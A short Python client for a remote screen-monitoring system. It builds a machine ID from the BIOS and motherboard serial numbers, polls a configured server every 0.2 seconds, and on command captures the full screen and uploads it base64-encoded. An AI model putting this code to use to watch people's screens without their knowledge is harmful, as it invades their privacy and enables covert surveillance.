"""
被监控的客户端，需要获取如下信息:
01 主板序列号/BIOS序列号 生成机器码
02 实时截图
"""

from wmi import WMI
from PIL import ImageGrab
from base64 import b64encode
from requests import post
from time import sleep
from configparser import ConfigParser


Config = ConfigParser()
Config.read("config.ini")

url = 'http://' + Config.get('server', 'host') + ':' + Config.get('server', 'port1')
save_path = Config.get('file', 'path')



def serial_number():
    bios = WMI().Win32_BIOS()[0]
    board = WMI().Win32_BaseBoard()[0]
    return bios.SerialNumber+board.SerialNumber


def screen_shot(save_path):
    image = ImageGrab.grab()
    image.save(save_path)
    image = b64encode(open(save_path,'rb').read())
    return image

def main(serialNumber):
    data = {
        'transferType' : 'heartBeat',
        'serialNumber' : serialNumber
    }
    try:
        receive_data = post(url,data).text
    except:
        receive_data = 'heart'

    if receive_data == 'screenShot':
        image = screen_shot(save_path)
        serialNumber = serial_number()
        post_data = {
            'serialNumber' : serialNumber,
            'image' : image,
            'transferType' : 'sendImage'
        }
        print('---成功截屏---')
        post(url,post_data)

if __name__ == '__main__':
    serialNumber = serial_number()
    while True:
        main(serialNumber)
        sleep(0.2)